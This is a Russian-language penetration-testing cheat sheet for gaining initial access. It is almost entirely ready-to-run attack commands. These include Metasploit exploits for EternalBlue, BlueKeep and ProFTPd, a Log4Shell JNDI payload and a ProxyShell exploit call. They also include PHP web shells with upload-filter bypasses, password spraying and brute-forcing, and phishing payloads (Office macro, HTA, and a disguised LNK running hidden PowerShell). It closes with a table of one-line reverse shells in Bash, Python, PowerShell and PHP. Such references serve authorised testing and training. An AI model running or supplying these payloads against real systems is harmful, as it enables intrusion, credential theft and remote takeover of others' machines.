# 🚪 Этап 1: Первоначальный доступ

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[Английский оригинал](../01-Initial-Access.md) • [Русский указатель](../../README.ru.md)
[🇹🇷 Türkçe Sürüm](01-Initial-Access.tr.md) • [🇬🇷 Ελληνικά](01-Initial-Access.el.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Цель:** Получить первоначальный доступ к целевой сети или системе.

---

## 🎯 Векторы атаки

| Вектор | Описание |
|--------|-------------|
| **Эксплуатация публичного приложения** | Уязвимости веб-приложений, API и CMS |
| **Фишинг** | Вредоносные письма с полезной нагрузкой (payload) |
| **Действительные учётные данные** | Распыление паролей и подстановка утёкших учётных данных |
| **Внешние службы** | Доступные извне RDP, SSH, VPN и FTP |
| **Цепочка поставок** | Компрометация доверенного ПО |

---

## 💻 Эксплуатация известных уязвимостей

### Поиск эксплойтов
```bash
# SearchSploit — локальная база эксплойтов
searchsploit apache 2.4
searchsploit -m 41234  # Скопировать эксплойт в текущий каталог
searchsploit --nmap scan.xml  # Разобрать результаты Nmap

# Поиск в Metasploit
msfconsole -q -x "search type:exploit apache"
```

### Распространённые эксплойты

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Проверить наличие уязвимости
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Эксплуатация через Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Проверка на уязвимость
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Настроить сервер для эксплойта
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Проверить наличие ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Использовать эксплойт
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Атаки на веб-приложения

### SQL-инъекция (получение оболочки)
```bash
# Проверка на SQL-инъекцию
sqlmap -u "http://target.com/page?id=1" --batch

# Получить системную оболочку через SQL-инъекцию
sqlmap -u "http://target.com/page?id=1" --os-shell

# Получить SQL-оболочку
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Загрузка файла для получения оболочки
```bash
# Создать обратную оболочку (reverse shell) на PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Или простая PHP-оболочка
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Обход фильтров расширений
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Удалённое выполнение кода (RCE)
```bash
# Проверка на удалённое выполнение кода
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Обратная оболочка через RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Атаки на учётные данные

### Распыление паролей (Password Spraying)
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Подстановка утёкших учётных данных (Credential Stuffing)
```bash
# Использование известных утёкших учётных данных
hydra -C creds.txt ftp://192.168.1.10

# Формат файла creds.txt:
# username:password
```

### Учётные данные по умолчанию
```bash
# Распространённые значения по умолчанию:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec с типовыми учётными данными
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Полезные нагрузки для фишинга

### Полезная нагрузка в макросе Office
```bash
# Создать полезную нагрузку в виде макроса
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Или использовать msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### Полезная нагрузка HTA
```bash
# Создать файл HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Разместить файл на сервере
python3 -m http.server 80
```

### Полезная нагрузка LNK
```powershell
# Создать вредоносный ярлык
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ Эксплуатация внешних служб

### Эксплуатация RDP
```bash
# Перебор паролей RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### Эксплуатация SSH
```bash
# Перебор паролей SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH с известными учётными данными
ssh user@192.168.1.10

# SSH с закрытым ключом
ssh -i id_rsa user@192.168.1.10
```

### Эксплуатация FTP
```bash
# Анонимный вход
ftp 192.168.1.10
# Имя пользователя: anonymous
# Пароль: anonymous

# Перебор паролей
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# Эксплойт ProFTPd
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Настройка слушателей (listeners)

### Слушатель Netcat
```bash
nc -lvnp 4444
```

### Обработчик Metasploit
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# На машине атакующего
powercat -l -p 4444

# На целевой машине
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Краткий справочник

### Однострочные обратные оболочки

| ОС | Команда |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 Связанные шпаргалки

- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)
- [Hydra](../../Hydra/README.md)
- [Веб-уязвимости](../../SSRF/README.md)

---

**Следующий этап:** [02 - Перечисление и обнаружение →](./02-Enumeration.ru.md)
